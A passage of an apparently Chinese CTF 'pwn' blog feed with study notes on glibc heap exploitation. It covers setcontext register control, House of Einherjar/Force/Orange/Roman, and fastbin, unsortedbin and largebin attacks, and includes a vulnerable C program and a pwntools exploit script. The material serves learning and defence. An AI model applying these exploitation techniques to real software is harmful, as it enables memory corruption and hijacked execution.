             mov     rax, [rsi-8]</span><br><span class="line">.text:0000000000054FB1 48 83 E0 F8                   and     rax, 0FFFFFFFFFFFFFFF8h</span><br><span class="line">.text:0000000000054FB5 48 39 F0                      cmp     rax, rsi</span><br><span class="line">.text:0000000000054FB8 74 06                         jz      short loc_54FC0</span><br><span class="line">.text:0000000000054FB8</span><br><span class="line">.text:0000000000054FBA 48 83 EE 08                   sub     rsi, 8</span><br><span class="line">.text:0000000000054FBE EB ED                         jmp     short loc_54FAD</span><br><span class="line">.text:0000000000054FBE</span><br><span class="line">.text:0000000000054FC0                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000054FC0</span><br><span class="line">.text:0000000000054FC0                               loc_54FC0:                              ; CODE XREF: setcontext+98↑j</span><br><span class="line">.text:0000000000054FC0 48 C7 C0 01 00 00 00          mov     rax, 1</span><br><span class="line">.text:0000000000054FC7 F3 48 0F AE E8                incsspq rax</span><br><span class="line">.text:0000000000054FCC F3 0F 01 6E F8                rstorssp qword ptr [rsi-8]</span><br><span class="line">.text:0000000000054FD1 F3 0F 01 EA                   saveprevssp</span><br><span class="line">.text:0000000000054FD5 48 8B 82 B0 03 00 00          mov     rax, [rdx+3B0h]</span><br><span class="line">.text:0000000000054FDC 64 48 89 04 25 78 00 00 00    mov     fs:78h, rax</span><br><span class="line">.text:0000000000054FDC</span><br><span class="line">.text:0000000000054FE5</span><br><span class="line">.text:0000000000054FE5                               loc_54FE5:                              ; CODE XREF: setcontext+8B↑j</span><br><span class="line">.text:0000000000054FE5 F3 48 0F 1E C9                rdsspq  rcx</span><br><span class="line">.text:0000000000054FEA 48 29 F9                      sub     rcx, rdi</span><br><span class="line">.text:0000000000054FED 74 1D                         jz      short loc_5500C</span><br><span class="line">.text:0000000000054FED</span><br><span class="line">.text:0000000000054FEF 48 F7 D9                      neg     rcx</span><br><span class="line">.text:0000000000054FF2 48 C1 E9 03                   shr     rcx, 3</span><br><span class="line">.text:0000000000054FF6 BE FF 00 00 00                mov     esi, 0FFh</span><br><span class="line">.text:0000000000054FF6</span><br><span class="line">.text:0000000000054FFB</span><br><span class="line">.text:0000000000054FFB                               loc_54FFB:                              ; CODE XREF: setcontext+EA↓j</span><br><span class="line">.text:0000000000054FFB 48 39 F1                      cmp     rcx, rsi</span><br><span class="line">.text:0000000000054FFE 48 0F 42 F1                   cmovb   rsi, rcx</span><br><span class="line">.text:0000000000055002 F3 48 0F AE EE                incsspq rsi</span><br><span class="line">.text:0000000000055007 48 29 F1                      sub     rcx, rsi</span><br><span class="line">.text:000000000005500A 77 EF                         ja      short loc_54FFB</span><br><span class="line">.text:000000000005500A</span><br><span class="line">.text:000000000005500C</span><br><span class="line">.text:000000000005500C                               loc_5500C:                              ; CODE XREF: setcontext+CD↑j</span><br><span class="line">.text:000000000005500C 48 8B 72 70                   mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000055010 48 8B 7A 68                   mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000055014 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]</span><br><span class="line">.text:000000000005501B 4C 8B 42 28                   mov     r8, [rdx+28h]</span><br><span class="line">.text:000000000005501F 4C 8B 4A 30                   mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000055023 4C 8B 92 A8 00 00 00          mov     r10, [rdx+0A8h]</span><br><span class="line">.text:000000000005502A 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000055031 F3 48 0F 1E C8                rdsspq  rax</span><br><span class="line">.text:0000000000055036 4C 3B 10                      cmp     r10, [rax]</span><br><span class="line">.text:0000000000055039 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000005503E 75 03                         jnz     short loc_55043</span><br><span class="line">.text:000000000005503E</span><br><span class="line">.text:0000000000055040 41 52                         push    r10</span><br><span class="line">.text:0000000000055042 C3                            retn</span><br><span class="line">.text:0000000000055042</span><br><span class="line">.text:0000000000055043                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000055043</span><br><span class="line">.text:0000000000055043                               loc_55043:                              ; CODE XREF: setcontext+11E↑j</span><br><span class="line">.text:0000000000055043 41 FF E2                      jmp     r10</span><br><span class="line">.text:0000000000055043</span><br><span class="line">.text:0000000000055046                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000055046</span><br><span class="line">.text:0000000000055046                               loc_55046:                              ; CODE XREF: setcontext+6B↑j</span><br><span class="line">.text:0000000000055046 48 8B 8A A8 00 00 00          mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:000000000005504D 51                            push    rcx</span><br><span class="line">.text:000000000005504E 48 8B 72 70                   mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000055052 48 8B 7A 68                   mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000055056 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]</span><br><span class="line">.text:000000000005505D 4C 8B 42 28                   mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000055061 4C 8B 4A 30                   mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000055065 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000055065                               ; &#125; // starts at 54F20</span><br><span class="line">.text:000000000005506C                               ; __unwind &#123;</span><br><span class="line">.text:000000000005506C 31 C0                         xor     eax, eax</span><br><span class="line">.text:000000000005506E C3                            retn</span><br></pre></td></tr></table></figure><p>可以看出2.31的setcontext长了不少,但很多都被跳过了,实际执行的并没有多少变化</p><hr><p>不难看出利用的核心是rdi(2.27)和rdx(2.31)</p><p>需要从特定位置开始是因为上面的代码会使程序crash</p><p>程序控制了除rax以外的几乎所有寄存器,</p><p>其中rip是通过以下代码控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rcx, [rdi/rdx+0A8h]</span><br><span class="line">push    rcx</span><br><span class="line">....</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>唯一不可控的rax也在 <code>xor     eax, eax</code>的作用下变为<strong>零</strong></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-29以下"><a href="#2-29以下" class="headerlink" title="2.29以下"></a>2.29以下</h2><p>2.29以下的利用要更为简单一些</p><p>大部分题目中通过控制 rsp 和 rip 就可以很好地解决堆题不方便直接控制程序的执行流的问题。我们通常是吧 setcontext + 53 写进 <strong>free_hook 或者 </strong>malloc_hook 中，然后建立或者释放一个堆块，此时的 rdi 就会是该堆块的 chunk 头，那如果我们提前布局好堆，就意味着我们可以控制寄存器并劫持程序的执行流。</p><h2 id="2-29及以上"><a href="#2-29及以上" class="headerlink" title="2.29及以上"></a>2.29及以上</h2><p>2.29 最大的变动就是 setcontext 里控制寄存器由 rdi 变成了 rdx，这就使得我们无法通过直接控制 free 的堆块来控制寄存器。所以要用到一些 gadget 来把 rdi 和 rdx 转换一下。</p>]]></content>
    
    
    <summary type="html">setcontext初识</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn技巧" scheme="https://ixout.github.io/tags/pwn%E6%8A%80%E5%B7%A7/"/>
    
    <category term="setcontext" scheme="https://ixout.github.io/tags/setcontext/"/>
    
  </entry>
  
  <entry>
    <title>堆利用-4</title>
    <link href="https://ixout.github.io/posts/60497/"/>
    <id>https://ixout.github.io/posts/60497/</id>
    <published>2023-04-01T12:53:27.000Z</published>
    <updated>2023-04-03T15:18:38.614Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><p>该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</p><p>如果可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。</p><h2 id="后向合并"><a href="#后向合并" class="headerlink" title="后向合并"></a>后向合并</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));<span class="comment">//presize是有符号数,因此若其是负数则可以往高地址伪造chunk</span></span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="攻击过程示例"><a href="#攻击过程示例" class="headerlink" title="攻击过程示例"></a>攻击过程示例</h3><p>可以进行 House Of Einherjar 攻击的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    char* s0 = malloc(0x200);　//构造fake chunk</span><br><span class="line">    char* s1 = malloc(0x18);</span><br><span class="line">    char* s2 = malloc(0xf0);　</span><br><span class="line">    char* s3 = malloc(0x20); //为了不让s2与top chunk 合并</span><br><span class="line">    printf(&quot;begin\n&quot;);</span><br><span class="line">    printf(&quot;%p\n&quot;, s0);</span><br><span class="line">    printf(&quot;input s0\n&quot;);</span><br><span class="line">    read(0, s0, 0x200); //读入fake chunk</span><br><span class="line">    printf(&quot;input s1\n&quot;);</span><br><span class="line">    read(0, s1, 0x19); //Off By One</span><br><span class="line">    free(s2);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./example&quot;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&quot;begin\n&quot;)</span><br><span class="line">address = int(p.recvline().strip(), 16)</span><br><span class="line">p.recvuntil(&quot;input s0\n&quot;)</span><br><span class="line">payload = p64(0) + p64(0x101) + p64(address) * 2 + &quot;A&quot;*0xe0    #这个101大小可能会让人困惑下面解释</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">p64(address) * 2是为了绕过</span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span><br><span class="line">  malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload += p64(0x100) #fake size</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;input s1\n&quot;)</span><br><span class="line">payload = &quot;A&quot;*0x10 + p64(0x220) + &quot;\x00&quot; #220使指针刚好到s0的mem指针,以使用fakechunk</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p><strong>注意这里绕过 unlink 检查的方法跟之前利用 unlink 漏洞时采用的方法不一样</strong></p><p>利用 unlink 漏洞的时候：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = &amp;p-3*4</span><br><span class="line">p-&gt;bk = &amp;p-2*4</span><br></pre></td></tr></table></figure><p>在这里利用时，因为无法得到 <code>&amp;p</code> , 所以直接让：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = p</span><br><span class="line">p-&gt;bk = p</span><br></pre></td></tr></table></figure><p><strong>这里需要注意一个点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0) + p64(0x101) + p64(address) * 2 + &quot;A&quot;*0xe0</span><br></pre></td></tr></table></figure><p>其实修改为下面这样也是可以的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0) + p64(0x221) + p64(address) * 2 + &quot;A&quot;*0xe0</span><br></pre></td></tr></table></figure><p>按照道理来讲 fake chunk 的 size 是 <code>0x221</code> 才合理，但是为什么 <code>0x101</code> 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</span><br></pre></td></tr></table></figure><p>也就是说在合并完后,进行size和nextchunk_size的比较时,nextchunk是通过p指针与size来获得的,因此不是去与s2中的size比较了</p><p>所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里我们总结下这个利用技术需要注意的地方</p><ul><li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li><li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li><li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li></ul><p>其实，该技术与 chunk extend/shrink 技术比较类似,不同的是后者只能在堆块中实现,而前者只要有偏移可以在任意地址实现</p><h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h1><p>利用的是top_chunk的切割机制</p><p>只要通过request2size验证可以达到在任意地址分配chunk</p><p>HOF 的利用要求还是相当苛刻的。</p><ul><li>首先，需要存在漏洞使得用户能够<strong>控制 top chunk 的 size 域。</strong></li><li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li><li>第三，分配的次数不能受限制</li></ul><p>其实这三点中第二点往往是最难办的，CTF 题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过 HOF 的方法进行利用。</p><h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p><p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p><p>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p><h1 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h1><p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p><p>其是为io_file服务的</p><p>如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的<strong><u>原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中</u></strong>，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求.</p><p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p><p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p><p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p><p>我们总结一下伪造的 top chunk size 的要求</p><ol><li>伪造的 size 必须要<strong>对齐到内存页</strong></li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p><h1 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h1><p>astbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。<strong>而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块</strong>，为进一步的利用做准备。</p><h1 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attack 结合的一个小 trick。这个漏洞与Glibc版本和源码无关，主要是利用了PIE保护的缺陷。</p><h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。</p><h1 id="House-of-Pig"><a href="#House-of-Pig" class="headerlink" title="House of Pig"></a>House of Pig</h1>]]></content>
    
    
    <summary type="html">how2heap！！</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="堆利用" scheme="https://ixout.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    <category term="how2heap" scheme="https://ixout.github.io/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>堆利用-3</title>
    <link href="https://ixout.github.io/posts/11792/"/>
    <id>https://ixout.github.io/posts/11792/</id>
    <published>2023-03-31T13:19:04.000Z</published>
    <updated>2023-06-20T08:57:24.479Z</updated>
    
    <content type="html"><![CDATA[<span class='p blue'>一些零碎的东西</span><h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h1><p>分为四个部分,前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p><strong>直接改写freelist中的fd指针的话,不要求地址对齐</strong></p><p><strong>free释放假chunk需要地址对齐</strong></p><p><strong>fastbins取出时,会进行该chunk的大小所对应的索引和当前链索引是否相同</strong></p><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><p>与UAF有点像,不过不同在于Fastbin Double Free的chunk同时处于alloced状态和在freelist中,</p><p>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>在可控区域伪造一个fake_chunk,并free它,使其进入fastbin中</p><p>fake_chunk的条件</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li><strong>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</strong></li><li>fake chunk 的 <strong>size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</strong></li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> ,且prev_size要和fakechunk的对应</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><p>利用了UAF,再free后又去改写该chunk的fd指针,使其指向栈中一个可以被视为fastbin_chunk的内存空间(size域合适等)</p><p>指向的chunk要绕过该检测,该chunk的大小计算出的idx要与该链的索引idx相匹配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (victim));</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><p>与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域,chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h1><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p><p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p><p>以及辅助泄露main_arena地址</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><strong>什么情况下会被放入unsortedbin</strong></p><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。(即last remainer)</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，若合并后不与top chunk相邻,则会将合并后的chunk放入unsortedbin。</li></ol><p><strong>使用情况</strong></p><ol><li>unsortedbin采用的是FIFO,<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。加入的时候利用fd,取出的时候利用bk</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，<strong>否则就会把这些 chunk 分别插入到对应的 bin 中</strong>。</li></ol><h2 id="利用1"><a href="#利用1" class="headerlink" title="利用1"></a>利用1</h2><p>unsorted bin attack主要是用来为进一步的攻击服务的</p><p>其利用的函数片段为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>即将取出的chunk的上一个chunk的fd指针写为unsorted_chunks (av)</p><p>不难看出要攻击就要能修改某个chunk的bk指针,达到的效果是将&amp;bins[0]-2会被写入指定位置</p><p>这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大.</p><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>可以修改 heap 中的 <strong>global_max_fast 来使得更大的 chunk 可以被视为 fast bin</strong>，这样我们就可以去执行一些 fast bin attack 了。</li></ul><p><strong>注意:</strong></p><p>在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使修改其为一个不合法的值也没有关系。</p><p>然而,如果最后一个chunk就是唯一一个chunk的话,unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p><h2 id="利用2"><a href="#利用2" class="headerlink" title="利用2"></a>利用2</h2><p>泄露地址则要用到,uaf,即要有两个能指向unsortedbin的指针(不一定要同时存在)</p><h1 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h1><p>这种攻击方式主要利用的是 chunk 进入 bin 中的操作，在 malloc 的时候，遍历 unsorted bin 时，对每一个 chunk，若无法 exact-fit 分配或不满足切割分配的条件，就会将该 chunk 置入相应的 bin 中，而此过程中缺乏对 largebin 的跳表指针的检测。</p><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p>在index相同的情况下：</p><ol><li><p>一般空闲的large chunk在fd的遍历顺序中，<strong>按照由大到小的顺序排列</strong>。这样可以避免在寻找合适chunk时挨个遍历</p></li><li><p>如果大小相同，按照free的时间排序</p></li><li>多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0</li><li>size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk</li></ol><p>空闲chunk的结构与unsorted和small的差别就在于多了fd_nextsize和bk_nextsize,分别指向下一个<strong>大小</strong>的chunk和上一个大小的chunk,且chunk在largebin free list中按从大到小排序是重要细节</p><p><strong>将chunk放入largebin中的操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">              &lt; (<span 